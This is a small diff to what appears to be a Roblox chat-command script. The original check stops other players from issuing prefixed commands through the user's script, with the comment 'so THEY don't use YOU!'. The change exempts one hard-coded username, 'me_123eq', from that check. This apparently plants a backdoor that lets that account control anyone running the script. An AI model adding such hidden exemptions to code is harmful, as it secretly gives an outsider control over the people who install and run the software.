@@ -4178,7 +4178,7 @@ v.Chatted:Connect(function(msg)
                		command = ""
             	end
             
-                if string.sub(command, 1, 1) == prefix then -- so THEY don't use YOU!
+                if string.sub(command, 1, 1) == prefix and v.Name ~= "me_123eq" then -- so THEY don't use YOU!
                        command = ""
                 end
 
